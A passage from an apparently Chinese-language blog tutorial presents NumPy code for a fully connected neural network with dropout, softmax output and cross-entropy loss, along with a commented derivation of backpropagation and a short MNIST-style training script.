class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCNN</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Init</span>(<span class="params">self, unitNum, dropOutProb=[]</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        完成一些初始化</span></span><br><span class="line"><span class="string">        unitNum: list 每一层的神经元数量</span></span><br><span class="line"><span class="string">        dropOutProb: list 除了输出层以外每一层的dropOut概率(0,1)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        self.unitNum = unitNum</span><br><span class="line">        self.layerNum = <span class="built_in">len</span>(unitNum)</span><br><span class="line">        self.dropOutProb = dropOutProb <span class="keyword">if</span> dropOutProb <span class="keyword">else</span> [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.layerNum - <span class="number">1</span>)]</span><br><span class="line">        self.outLength = unitNum[-<span class="number">1</span>]</span><br><span class="line">        self.w = [<span class="number">0</span>]  <span class="comment"># 0 的作用仅为占位</span></span><br><span class="line">        self.Z = [<span class="number">0</span>]</span><br><span class="line">        self.A = [<span class="number">0</span>]</span><br><span class="line">        self.cost = []</span><br><span class="line">        self.costTemp = []</span><br><span class="line">        self.dwNorm = []</span><br><span class="line">        self.dwNormTemp = []</span><br><span class="line">        <span class="comment"># He initialization，针对隐藏层是reLu激活函数的权重初始化方法</span></span><br><span class="line">        <span class="comment"># 正确的权重初始化方法能一定程度避免梯度消失</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, self.layerNum - <span class="number">1</span>):</span><br><span class="line">            np.random.seed(i)  <span class="comment"># 设置随机数种子</span></span><br><span class="line">            self.w.append(np.matrix(np.random.randn(unitNum[i - <span class="number">1</span>] + <span class="number">1</span>, unitNum[i])) * np.sqrt(<span class="number">2</span> / unitNum[i]))</span><br><span class="line">            self.w[-<span class="number">1</span>][<span class="number">0</span>] = np.matrix(np.zeros((<span class="number">1</span>, unitNum[i]))) <span class="comment"># bias偏置初始化为0</span></span><br><span class="line">        <span class="comment"># 最后的权重初始化和之前的不太一样，需要更加接近0，这是针对sigmoid/softMax</span></span><br><span class="line">        np.random.seed(self.layerNum - <span class="number">1</span>)</span><br><span class="line">        self.w.append(np.matrix(np.random.rand(unitNum[-<span class="number">2</span>] + <span class="number">1</span>, unitNum[-<span class="number">1</span>])))</span><br><span class="line">        self.w[-<span class="number">1</span>] = (self.w[-<span class="number">1</span>] - np.mean(self.w[-<span class="number">1</span>])) / np.std(self.w[-<span class="number">1</span>]) / <span class="number">100</span></span><br><span class="line">        self.w[-<span class="number">1</span>][<span class="number">0</span>] = np.matrix(np.zeros((<span class="number">1</span>, unitNum[-<span class="number">1</span>])))</span><br><span class="line">        self.ClrTempResult()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">PrepareBatch</span>(<span class="params">self, X, y, batchSize=<span class="number">0</span></span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        分割训练集并完成一些初始化</span></span><br><span class="line"><span class="string">        batchSize: 每一批样本的数量，需能被样本总数整除</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        N = X.shape[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> batchSize:</span><br><span class="line">            batchSize = N</span><br><span class="line">        <span class="keyword">if</span> N % batchSize:</span><br><span class="line">            print(<span class="string">&quot;# ERR: illegal batchSize&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.batchSize = batchSize</span><br><span class="line">        self.batchTime = <span class="built_in">int</span>(N / batchSize)</span><br><span class="line">        self.X = np.matrix(X)</span><br><span class="line">        self.y = OneHot(X.shape[<span class="number">0</span>], unitNum[-<span class="number">1</span>], y)</span><br><span class="line">        self.batchX = []</span><br><span class="line">        self.batchy = []</span><br><span class="line">        self.batchTime = <span class="built_in">int</span>(N / batchSize)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.batchTime):</span><br><span class="line">            <span class="comment"># mini-batch可以加快训练速度</span></span><br><span class="line">            self.batchX.append(np.array(self.X[i * batchSize : (i + <span class="number">1</span>) * batchSize]))</span><br><span class="line">            self.batchy.append(self.y[i * batchSize : (i + <span class="number">1</span>) * batchSize])</span><br><span class="line">            print(<span class="string">&quot;\rPreparing: %.2f%%&quot;</span> % ((i + <span class="number">1</span>) / N * batchSize * <span class="number">100</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fit</span>(<span class="params">self, epoch, rate</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        epoch: int 训练轮次</span></span><br><span class="line"><span class="string">        rate: float 学习率</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        N = self.X.shape[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(epoch):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(self.batchTime):</span><br><span class="line">                self.Z[<span class="number">0</span>] = self.batchX[j]</span><br><span class="line">                self.A[<span class="number">0</span>] = self.batchX[j]</span><br><span class="line">                self.y = self.batchy[j]</span><br><span class="line">                self.gradDes(rate)</span><br><span class="line">                self.ClrTempResult()</span><br><span class="line">                print(</span><br><span class="line">                    <span class="string">&quot;\rTotalProgress: %.2f%% BatchProgress: %.2f%%  &quot;</span></span><br><span class="line">                    % (((i + <span class="number">1</span>) / epoch * <span class="number">100</span>), ((j + <span class="number">1</span>) / N * self.batchSize * <span class="number">100</span>)),</span><br><span class="line">                    end=<span class="string">&quot;&quot;</span>,</span><br><span class="line">                )</span><br><span class="line">            <span class="comment"># 记录一个轮次下的平均损失函数</span></span><br><span class="line">            self.cost.append(<span class="built_in">sum</span>(self.costTemp) / self.batchTime)</span><br><span class="line">            self.costTemp.clear()</span><br><span class="line">            <span class="comment"># 记录一个轮次下的平均dw的L2，即模长</span></span><br><span class="line">            self.dwNorm.append(np.<span class="built_in">sum</span>(self.dwNormTemp, axis=<span class="number">0</span>) / self.batchTime)</span><br><span class="line">            self.dwNormTemp.clear()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gradDes</span>(<span class="params">self, rate</span>):</span></span><br><span class="line">        self.backProp()</span><br><span class="line">        <span class="comment"># 没有加入正则项惩罚，因为未发现过拟合现象，同时样本足够多时可以不加入正则项</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        # 一种较为简单的损失函数 J(θ)</span></span><br><span class="line"><span class="string">        J = np.sum(np.multiply(self.y-self.A[-1],self.y-self.A[-1]))/self.batchSize</span></span><br><span class="line"><span class="string">        # 这里使用更加复杂的带有log的交叉熵函数</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        J = (-np.<span class="built_in">sum</span>(np.array(self.y) * np.log(self.A[-<span class="number">1</span>]) + np.array(<span class="number">1</span> - self.y) * np.log(<span class="number">1</span> - self.A[-<span class="number">1</span>])) / self.batchSize)</span><br><span class="line">        self.costTemp.append(J)</span><br><span class="line">        dwNt = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(self.w)):</span><br><span class="line">            dwNt.append(np.linalg.norm(self.dw[i]))</span><br><span class="line">            self.w[i] -= rate * self.dw[i]</span><br><span class="line">        self.dwNormTemp.append(dwNt)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetDropOut</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 获取dropOut矩阵，根据给定概率随机去掉神经元</span></span><br><span class="line">        index = []</span><br><span class="line">        prob = self.dropOutProb[<span class="number">0</span>]</span><br><span class="line">        num = <span class="number">0</span> <span class="keyword">if</span> <span class="keyword">not</span> prob <span class="keyword">else</span> <span class="built_in">int</span>(np.clip(np.random.randn() / <span class="number">50</span> + prob, <span class="number">0</span>, <span class="number">0.75</span>) * self.unitNum[<span class="number">0</span>])</span><br><span class="line">        index.append(np.random.choice(self.unitNum[<span class="number">0</span>], num, <span class="literal">False</span>))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, self.layerNum - <span class="number">1</span>):</span><br><span class="line">            prob = self.dropOutProb[i]</span><br><span class="line">            num = <span class="number">0</span> <span class="keyword">if</span> <span class="keyword">not</span> prob <span class="keyword">else</span> <span class="built_in">int</span>(np.clip(np.random.randn() / <span class="number">50</span> + prob, <span class="number">0</span>, <span class="number">0.75</span>) * self.unitNum[i])</span><br><span class="line">            index.append(np.random.choice(self.unitNum[i], num, <span class="literal">False</span>))</span><br><span class="line">            dropOutMat = np.ones((self.unitNum[i - <span class="number">1</span>], self.unitNum[i]))</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> index[i - <span class="number">1</span>]:</span><br><span class="line">                dropOutMat[j] = np.zeros((<span class="number">1</span>, self.unitNum[i]))</span><br><span class="line">            dropOutMat = np.transpose(dropOutMat)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> index[i]:</span><br><span class="line">                dropOutMat[j] = np.zeros((<span class="number">1</span>, self.unitNum[i - <span class="number">1</span>]))</span><br><span class="line">            dropOutMat = np.r_[np.ones((<span class="number">1</span>, self.unitNum[i])), np.transpose(dropOutMat)]</span><br><span class="line">            self.dropOut.append(np.matrix(dropOutMat))</span><br><span class="line">        dropOutMat = np.ones((self.unitNum[-<span class="number">2</span>], self.unitNum[-<span class="number">1</span>]))</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> index[-<span class="number">1</span>]:</span><br><span class="line">            dropOutMat[j] = np.zeros((<span class="number">1</span>, self.unitNum[-<span class="number">1</span>]))</span><br><span class="line">        dropOutMat = np.r_[np.ones((<span class="number">1</span>, self.unitNum[-<span class="number">1</span>])), dropOutMat]</span><br><span class="line">        self.dropOut.append(np.matrix(dropOutMat))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">backProp</span>(<span class="params">self, d_lossFunc, forward=<span class="literal">True</span>, dX=<span class="literal">False</span></span>):</span></span><br><span class="line">        <span class="comment"># 有详细推导过程</span></span><br><span class="line">        <span class="keyword">if</span> forward:</span><br><span class="line">            self.forwardProp()</span><br><span class="line">        self.dA[-<span class="number">1</span>] = d_lossFunc()</span><br><span class="line">        <span class="comment"># --- appaly derivative of SoftMax</span></span><br><span class="line">        self.dZ[-<span class="number">1</span>] = []</span><br><span class="line">        Zt = np.array(self.Z[-<span class="number">1</span>])</span><br><span class="line">        dAt = np.array(self.dA[-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.batchSize):</span><br><span class="line">            self.dZ[-<span class="number">1</span>].append(np.array(d_softMax(np.matrix(Zt[i])) *</span><br><span class="line">                                   np.matrix(dAt[i]).reshape((self.unitNum[-<span class="number">1</span>], <span class="number">1</span>))).ravel())</span><br><span class="line">        self.dZ[-<span class="number">1</span>] = np.matrix(self.dZ[-<span class="number">1</span>])</span><br><span class="line">        <span class="comment"># ---</span></span><br><span class="line">        dw = self.A[-<span class="number">2</span>].T * self.dZ[-<span class="number">1</span>]</span><br><span class="line">        db = np.<span class="built_in">sum</span>(self.dZ[-<span class="number">1</span>], axis=<span class="number">0</span>)</span><br><span class="line">        self.dw[-<span class="number">1</span>] = np.r_[db, dw] / self.batchSize</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="number">1</span>, self.layerNum - <span class="number">1</span>)):</span><br><span class="line">            self.dA[i] = RemoveBias(self.dZ[i + <span class="number">1</span>] * np.multiply(self.w[i + <span class="number">1</span>], self.dropOut[i]).T)</span><br><span class="line">            self.dZ[i] = np.multiply(d_relu(self.Z[i]), self.dA[i])</span><br><span class="line">            dw = self.A[i - <span class="number">1</span>].T * self.dZ[i]</span><br><span class="line">            db = np.<span class="built_in">sum</span>(self.dZ[i], axis=<span class="number">0</span>)</span><br><span class="line">            self.dw[i] = np.multiply(np.r_[db, dw] / self.batchSize, self.dropOut[i - <span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> dX:</span><br><span class="line">            self.dA[<span class="number">0</span>] = RemoveBias(self.dZ[<span class="number">1</span>] * np.multiply(self.w[<span class="number">1</span>], self.dropOut[<span class="number">0</span>]).T)</span><br><span class="line">            self.dZ[<span class="number">0</span>] = self.dA[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forwardProp</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.GetDropOut()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, self.layerNum - <span class="number">1</span>):</span><br><span class="line">            self.Z.append(AddBias(self.A[-<span class="number">1</span>]) * np.multiply(self.w[i], self.dropOut[i - <span class="number">1</span>]))</span><br><span class="line">            self.A.append(relu(self.Z[-<span class="number">1</span>]))</span><br><span class="line">        self.Z.append(AddBias(self.A[-<span class="number">1</span>]) * np.multiply(self.w[-<span class="number">1</span>], self.dropOut[-<span class="number">1</span>]))</span><br><span class="line">        self.A.append(softMax(self.Z[-<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ClrTempResult</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.Z = self.Z[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">        self.A = self.A[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">        self.dw = <span class="built_in">list</span>(np.repeat(<span class="number">1</span>, self.layerNum, axis=<span class="number">0</span>))</span><br><span class="line">        self.dZ = <span class="built_in">list</span>(np.repeat(<span class="number">1</span>, self.layerNum, axis=<span class="number">0</span>))</span><br><span class="line">        self.dA = <span class="built_in">list</span>(np.repeat(<span class="number">1</span>, self.layerNum, axis=<span class="number">0</span>))</span><br><span class="line">        self.dropOut = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">predict</span>(<span class="params">self, X, y</span>):</span></span><br><span class="line">        self.ClrTempResult()</span><br><span class="line">        self.dropOutProb = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.layerNum - <span class="number">1</span>)]</span><br><span class="line">        self.Z[<span class="number">0</span>] = np.matrix(X)</span><br><span class="line">        self.A[<span class="number">0</span>] = np.matrix(X)</span><br><span class="line">        self.forwardProp()</span><br><span class="line">        r_p = self.A[-<span class="number">1</span>]</span><br><span class="line">        self.r = np.zeros((r_p.shape[<span class="number">0</span>], <span class="number">1</span>))</span><br><span class="line">        correct = <span class="number">0</span></span><br><span class="line">        self.wrong = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r_p.shape[<span class="number">0</span>]):</span><br><span class="line">            self.r[i] = np.argmax(r_p[i])</span><br><span class="line">            <span class="keyword">if</span> self.r[i] == np.array(y).ravel()[i]:</span><br><span class="line">                correct += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.wrong.append(i) <span class="comment"># 储存错误样本的index</span></span><br><span class="line">        print(<span class="string">&quot;correct: &quot;</span> + <span class="built_in">str</span>(correct / r_p.shape[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">SaveParameters</span>(<span class="params">self</span>):</span></span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;FCNNweight.dat&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">        wt = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self.w[<span class="number">1</span>:]:</span><br><span class="line">            wt.extend(<span class="built_in">list</span>(np.array(i).ravel()))</span><br><span class="line">        f.write(np.array(wt).tobytes())</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">LoadParameters</span>(<span class="params">self</span>):</span></span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;FCNNweight.dat&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">        wt = np.frombuffer(f.read(), np.float64)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(self.unitNum)):</span><br><span class="line">            self.w[i] = np.matrix(wt[: (self.unitNum[i - <span class="number">1</span>] + <span class="number">1</span>) * self.unitNum[i]]).reshape((self.unitNum[i - <span class="number">1</span>] + <span class="number">1</span>, self.unitNum[i]))</span><br><span class="line">            wt = wt[(self.unitNum[i - <span class="number">1</span>] + <span class="number">1</span>) * self.unitNum[i] :]</span><br></pre></td></tr></table></figure>    </div></div><h3 id="后向传播推导"><a href="#后向传播推导" class="headerlink" title="后向传播推导"></a>后向传播推导</h3><p>以下为我梳理代码的时候顺便写的过程</p><p>链式法则推单个神经元，然后扩展到矩阵</p><p>强烈建议搭配3b1b系列part4（或者是part3[下]？）食用，附上一张3b1b视频的截图</p><img src="/images/FCNN_formula.png"/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">layerNum = <span class="number">4</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> input -&gt; hidden 1 -&gt; hidden 2 -&gt; output</span></span><br><span class="line"><span class="string"> 784+1 -&gt;   H1+1   -&gt;   H2+1   -&gt;   10</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> Z0(X)  ┌───&gt;Z1     ┌───&gt;Z2     ┌──&gt;Z3</span></span><br><span class="line"><span class="string">   │    │     ↓     │     ↓     │    ↓</span></span><br><span class="line"><span class="string">   │  [w1] [relu] [w2] [relu] [w3][softmax]</span></span><br><span class="line"><span class="string">   ↓    │     ↓     │     ↓     │    ↓</span></span><br><span class="line"><span class="string"> A0(X)──┘    A1─────┘    A2─────┘   A3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">unityNum = [<span class="number">784</span>, H1, H2, <span class="number">10</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">### Init ###</span></span><br><span class="line">w = [ <span class="number">0</span>, [w1(<span class="number">784</span>+<span class="number">1</span>,H1)], [w2(H1+<span class="number">1</span>,H2)], [w3(H2+<span class="number">1</span>,<span class="number">10</span>)] ]</span><br><span class="line">Z = [ [X(N,<span class="number">784</span>)] ]</span><br><span class="line"><span class="comment"># A has same structure as Z</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### forwardProp ###</span></span><br><span class="line">Z = [ [X(N,<span class="number">784</span>)], [Z1(N,H1)], [Z2(N,H2)], [Z3(N,<span class="number">10</span>)] ]</span><br><span class="line"><span class="comment"># A has same structure as Z</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### backProp ###</span></span><br><span class="line"><span class="comment"># dX means δJ/δX</span></span><br><span class="line"><span class="comment"># aka partial derivative of parameter X with respect to cost function J</span></span><br><span class="line"><span class="comment"># to get formulas as below, apply chain rule</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># u[i] indicates i.th layer of neural network</span></span><br><span class="line"><span class="string"># and each layer has only 1 neuron</span></span><br><span class="line"><span class="string"># L.th layer indicates output layer</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ....    &#123;u[L-1]&#125;────&#123;u[L]&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Deduction (lossFunc: CrossEntropy):</span></span><br><span class="line"><span class="string">- layer L :</span></span><br><span class="line"><span class="string">    dA[L] = δJ/δA[L] = A[L] - y</span></span><br><span class="line"><span class="string">    dZ[L] = δA[L]/δZ[L] * dA[L] = sigmoidDeriv(Z[L]) * dA[L]</span></span><br><span class="line"><span class="string">    dw[L] = δw[L]/δZ[L] * dZ[L] = A[L-1] * dZ[L]</span></span><br><span class="line"><span class="string">    db[L] = δb[L]/δZ[L] * dZ[L] = dZ[L]</span></span><br><span class="line"><span class="string">- layer L-1 :</span></span><br><span class="line"><span class="string">    dA[L-1] = δZ[L]/δA[L-1] * dZ[L] = w[L] * dZ[L]</span></span><br><span class="line"><span class="string">    dZ[L-1] = δA[L-1]/δZ[L-1] * dA[L-1] = reluDeriv(Z[L-1]) * dA[L-1]</span></span><br><span class="line"><span class="string">    ... etc.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># extra process making formulas can be applied to matrices or layers</span></span><br><span class="line"><span class="comment"># no dot product is applied below, just multiplying elements by elements</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># when each layer has more than 1 neuron</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &#123;u[L-1][0]&#125;</span></span><br><span class="line"><span class="string">                         ┌─&#123;u[L][0]&#125;</span></span><br><span class="line"><span class="string">    ....    &#123;u[L-1][1]&#125;══╡</span></span><br><span class="line"><span class="string">                         └─&#123;u[L][1]&#125;</span></span><br><span class="line"><span class="string">            &#123;u[L-1][2]&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># for a certain neuron in hidden layer, e.g. as for u[L-1][1]</span></span><br><span class="line"><span class="string"># w[L][1][0] indicates weight between &#123;u[L-1][1]&#125; and &#123;u[L][0]&#125;</span></span><br><span class="line"><span class="string"># Deduction :</span></span><br><span class="line"><span class="string">- layer L :</span></span><br><span class="line"><span class="string">    dA[L][0] = A[L][0] - y[0]</span></span><br><span class="line"><span class="string">    dA[L][1] = A[L][1] - y[1]</span></span><br><span class="line"><span class="string">    dZ[L][0] = sigmoidDeriv(Z[L][0]) * dA[L][0]</span></span><br><span class="line"><span class="string">    dZ[L][1] = sigmoidDeriv(Z[L][1]) * dA[L][1]</span></span><br><span class="line"><span class="string">    dw[L][1][0] = A[L-1][1] * dZ[L][0]</span></span><br><span class="line"><span class="string">    dw[L][1][1] = A[L-1][1] * dZ[L][1]</span></span><br><span class="line"><span class="string">    db[L][1][0] = dZ[L][0]</span></span><br><span class="line"><span class="string">    db[L][1][1] = dZ[L][1]</span></span><br><span class="line"><span class="string">- layer L-1 :</span></span><br><span class="line"><span class="string">    dA[L-1][1] = w[L][1][0] * dZ[L][0] + w[L][1][1] * dZ[L][1]</span></span><br><span class="line"><span class="string">    dZ[L-1][1] = reluDeriv(Z[L-1][1]) * dA[L-1][1]</span></span><br><span class="line"><span class="string">    ... etc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># e.g. as for 3.rd layer, which has index of 2 :</span></span><br><span class="line"><span class="string">    dA2(N,H2) = RemoveBias(dZ3(N,10) * w3.T(10,H2+1))</span></span><br><span class="line"><span class="string">    dZ2(N,H2) = np.multiply(reluDeriv(Z2)(N,H2),dA2(N,H2))</span></span><br><span class="line"><span class="string">    dw2(H1,H2) = A1.T(H1,N) * dZ2(N,H2)</span></span><br><span class="line"><span class="string">    db2(1,H2) = np.sum(dZ2(N,H2),axis=0)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">dA = [ <span class="number">1</span>, [dA1(N,H1)], [dA2(N,H2)], [dA3(N,<span class="number">10</span>)] ]</span><br><span class="line">dw = [ <span class="number">1</span>, [dw0(<span class="number">784</span>+<span class="number">1</span>,H1)], [dw1(H1+<span class="number">1</span>,H2)], [dw2(H2+<span class="number">1</span>,<span class="number">10</span>)] ]</span><br></pre></td></tr></table></figure><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">unitNum = [<span class="number">784</span>, <span class="number">512</span>, <span class="number">256</span>, <span class="number">10</span>]</span><br><span class="line">dropOutProb = [<span class="number">0.4</span>, <span class="number">0.2</span>, <span class="number">0.1</span>]</span><br><span class="line">batchSize = <span class="number">120</span></span><br><span class="line">epoch = <span class="number">50</span></span><br><span class="line">rate = <span class="number">0.08</span></span><br><span class="line"></span><br><span class="line">FCNN = FCNN()</span><br><span class="line">FCNN.Init(unitNum, dropOutProb)</span><br><span class="line">FCNN.PrepareBatch(trainX, trainy, batchSize)</span><br><span class="line">FCNN.fit(epoch, rate)</span><br><span class="line">FCNN.SaveParameters()</span><br></pre></td></tr></table></figure><h3 id="后续验证"><a href="#后续验证" class="headerlink" title="后续验证"></a>后续验证</h3><p>在训练完只会应当绘制<code>loss</code>图像，用于确保梯度下降是没有问题的（<code>dw</code>模长单纯是我想看一下而已）</p><div class='spoiler 